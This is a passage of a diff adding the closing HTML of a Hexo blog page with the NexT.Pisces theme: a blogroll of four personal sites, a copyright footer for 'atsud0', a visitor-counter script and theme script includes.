+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
